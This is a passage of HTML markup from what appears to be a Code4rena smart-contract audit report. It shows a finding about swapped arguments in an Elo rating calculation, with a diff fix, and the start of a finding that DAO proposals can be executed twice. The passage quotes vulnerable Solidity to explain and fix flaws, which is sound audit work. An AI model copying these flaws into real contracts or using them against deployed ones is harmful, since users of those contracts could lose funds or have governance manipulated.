0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003eFinding description and impact\u003c/h3\u003e\n\u003cp\u003eHere, the order of \u003ccode\u003eeloB\u003c/code\u003e and \u003ccode\u003eeloA\u003c/code\u003e is reversed, and subsequently, \u003ccode\u003eeloA\u003c/code\u003e and \u003ccode\u003eeloB\u003c/code\u003e are calculated with addition and subtraction based on the value of \u003ccode\u003enegative\u003c/code\u003e, leading to a final calculation error.\u003c/p\u003e\n\u003cpre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"93\"\u003e\u003ccode class=\"grvsc-code\"\u003e\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk4\"\u003efunction\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk11\"\u003ebattleElo\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003euint256\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ecurrentRating\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003euint8\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e[] \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ememory\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ebattles\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e) \u003c/span\u003e\u003cspan class=\"mtk11\"\u003epublic\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eview\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk11\"\u003ereturns\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e (\u003c/span\u003e\u003cspan class=\"mtk12\"\u003euint256\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e) {\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003euint256\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eeloA\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk7\"\u003e1000\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003euint256\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eeloB\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk7\"\u003e1000\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk15\"\u003efor\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e (\u003c/span\u003e\u003cspan class=\"mtk12\"\u003euint256\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ei\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk7\"\u003e0\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e; \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ei\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u0026lt; \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ebattles\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk12\"\u003elength\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e; \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ei\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e++) {\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e            \u003c/span\u003e\u003cspan class=\"mtk12\"\u003euint256\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eresult\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk11\"\u003emapBattleResultToGameResult\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003ebattles\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e[\u003c/span\u003e\u003cspan class=\"mtk12\"\u003ei\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e]);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e            (\u003c/span\u003e\u003cspan class=\"mtk12\"\u003euint256\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003echange\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ebool\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003enegative\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e) = \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eElo\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003eratingChange\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eeloB\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eeloA\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eresult\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ek\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e            \u003c/span\u003e\u003cspan class=\"mtk12\"\u003echange\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk11\"\u003e_roundUp\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003echange\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk7\"\u003e100\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e            \u003c/span\u003e\u003cspan class=\"mtk15\"\u003eif\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e (\u003c/span\u003e\u003cspan class=\"mtk12\"\u003enegative\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e) {\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e                \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eeloA\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e -= \u003c/span\u003e\u003cspan class=\"mtk12\"\u003echange\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e                \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eeloB\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e += \u003c/span\u003e\u003cspan class=\"mtk12\"\u003echange\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e            } \u003c/span\u003e\u003cspan class=\"mtk15\"\u003eelse\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e {\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e                \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eeloA\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e += \u003c/span\u003e\u003cspan class=\"mtk12\"\u003echange\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e                \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eeloB\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e -= \u003c/span\u003e\u003cspan class=\"mtk12\"\u003echange\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e            }\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        }\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk15\"\u003ereturn\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ecurrentRating\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e + \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eeloA\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e - \u003c/span\u003e\u003cspan class=\"mtk7\"\u003e1000\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    }\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003eIn the ELO system:\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e\u003ccode\u003eratingA\u003c/code\u003e usually represents Player A’s rating, and score is Player A’s score.\u003c/li\u003e\n\u003cli\u003e\u003ccode\u003eratingB\u003c/code\u003e is the opponent (Player B)’s rating.\u003c/li\u003e\n\u003c/ul\u003e\n\u003cp\u003eBut in this code:\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e\u003ccode\u003eeloA\u003c/code\u003e is regarded as Player A’s rating.\u003c/li\u003e\n\u003cli\u003e\u003ccode\u003eeloB\u003c/code\u003e is regarded as Player B’s rating.\u003c/li\u003e\n\u003c/ul\u003e\n\u003cp\u003eHowever, when calling \u003ccode\u003eElo.ratingChange(eloB, eloA, result, k)\u003c/code\u003e, it means:\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e\u003ccode\u003eratingA = eloB\u003c/code\u003e (Player B’s rating).\u003c/li\u003e\n\u003cli\u003e\u003ccode\u003eratingB = eloA\u003c/code\u003e (Player A’s rating).\u003c/li\u003e\n\u003cli\u003escore is the score of \u003ccode\u003eratingA\u003c/code\u003e (\u003ccode\u003eeloB\u003c/code\u003e).\u003c/li\u003e\n\u003c/ul\u003e\n\u003cp\u003eThis is unexpected. Usually, \u003ccode\u003eElo.ratingChange(eloA, eloB, result, k)\u003c/code\u003e should be used, because:\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e\u003ccode\u003eeloA\u003c/code\u003e is Player A’s rating, and result is Player A’s battle outcome.\u003c/li\u003e\n\u003cli\u003e\u003ccode\u003eeloB\u003c/code\u003e is Player B’s rating.\u003c/li\u003e\n\u003c/ul\u003e\n\u003cp\u003eDue to the wrong parameter order, \u003ccode\u003eElo.ratingChange\u003c/code\u003e calculates the change and direction of \u003ccode\u003eeloB\u003c/code\u003e (as \u003ccode\u003eratingA\u003c/code\u003e), not of \u003ccode\u003eeloA\u003c/code\u003e.\u003c/p\u003e\n\u003cpre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"94\"\u003e\u003ccode class=\"grvsc-code\"\u003e\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk3\"\u003e/// @notice Calculates the change in ELO rating, after a given outcome.\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk3\"\u003e/// @param ratingA the ELO rating of the player A\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk3\"\u003e/// @param ratingB the ELO rating of the player B\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk3\"\u003e/// @param score the score of the player A, scaled by 100. 100 = win, 50 = draw, 0 = loss\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk3\"\u003e/// @param kFactor the k-factor or development multiplier used to calculate the change in ELO rating. 20 is the typical value\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk3\"\u003e/// @return change the change in ELO rating of player A, with 2 decimals of precision. 1501 = 15.01 ELO change\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk3\"\u003e/// @return negative the directional change of player A\u0026#39;s ELO. Opposite sign for player B\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk4\"\u003efunction\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eratingChange\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003euint256\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eratingA\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e,\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003euint256\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eratingB\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e,\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003euint256\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003escore\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e,\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003euint256\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ekFactor\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    ) \u003c/span\u003e\u003cspan class=\"mtk11\"\u003einternal\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk11\"\u003epure\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk11\"\u003ereturns\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e (\u003c/span\u003e\u003cspan class=\"mtk12\"\u003euint256\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003echange\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ebool\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003enegative\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e) {\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\n\u003ch3 id=\"recommended-mitigation-steps-20\" style=\"position:relative;\"\u003e\u003ca href=\"#recommended-mitigation-steps-20\" aria-label=\"recommended mitigation steps 20 permalink\" class=\"anchor before\"\u003e\u003csvg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"\u003e\u003cpath fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003eRecommended mitigation steps\u003c/h3\u003e\n\u003cpre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"95\"\u003e\u003ccode class=\"grvsc-code\"\u003e\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e- \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eElo\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003eratingChange\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eeloB\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eeloA\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eresult\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ek\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e+ \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eElo\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003eratingChange\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eeloA\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eeloB\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eresult\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ek\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\n\u003chr\u003e\n\u003ch2 id=\"m-17-virtualgenesisdaosolearlyexecute-proposals-can-be-executed-two-times\" style=\"position:relative;\"\u003e\u003ca href=\"#m-17-virtualgenesisdaosolearlyexecute-proposals-can-be-executed-two-times\" aria-label=\"m 17 virtualgenesisdaosolearlyexecute proposals can be executed two times permalink\" class=\"anchor before\"\u003e\u003csvg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"\u003e\u003cpath fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003e\u003ca href=\"https://code4rena.com/audits/2025-04-virtuals-protocol/submissions/F-90\"\u003e[M-17] \u003ccode\u003eVirtualGenesisDAO.sol:earlyExecute()\u003c/code\u003e proposals can be executed two times\u003c/a\u003e\u003c/h2\u003e\n\u003cp\u003e\u003cem\u003eSubmitted by \u003ca href=\"https://code4rena.com/audits/2025-04-virtuals-protocol/submissions/S-595\"\u003eFitro\u003c/a\u003e\u003c/em\u003e\u003c/p\u003e\n\u003cp\u003e\u003ca href=\"https://github.com/code-423n4/2025-04-virtuals-protocol/blob/28e93273daec5a9c73c438e216dde04c084be452/contracts/governance/VirtualGenesisDAO.sol#L95-L118\"\u003ehttps://github.com/code-423n4/2025-04-virtuals-protocol/blob/28e93273daec5a9c73c438e216dde04c084be452/contracts/governance/VirtualGenesisDAO.sol#L95-L118\u003c/a\u003e\u003c/p\u003e\n\u003ch3 id=\"finding-description-and-impact-4\" style=\"position:relative;\"\u003e\u003ca href=\"#finding-description-and-impact-4\" aria-label=\"finding description and impact 4 permalink\" class=\"anchor before\"\u003e\u003csvg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"\u003e\u003cpath fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003eFinding description and impact\u003c/h3\u003e\n\u003cp\u003e\u003ccode\u003eearlyExecute()\u003c/code\u003e allows a proposal to be executed earlier but can only be called by an account with the \u003ccode\u003eEXECUTOR_ROLE\u003c/code\u003e.\u003c/p\u003e\n\u003cpre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"96\"\u003e\u003ccode class=\"grvsc-code\"\u003e\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk4\"\u003efunction\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eearlyExecute\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003euint256\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eproposalId\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e) \u003c/span\u003e\u003cspan class=\"mtk11\"\u003epublic\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk11\"\u003epayable\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eonlyRole\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eEXECUTOR_ROLE\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e) \u003c/span\u003e\u003cspan class=\"mtk11\"\u003ereturns\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e (\u003c/span\u003e\u003cspan class=\"mtk12\"\u003euint256\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e) {\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        (\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e            \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e[] \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ememory\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003etargets\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e,\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e            \u003c/span\u003e\u003cspan class=\"mtk12\"\u003euint256\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e[] \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ememory\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003evalues\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e,\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e            \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ebytes\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e[] \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ememory\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ecalldatas\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e,\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e            \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ebytes32\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003edescriptionHash\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        ) = \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eproposalDetails\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan 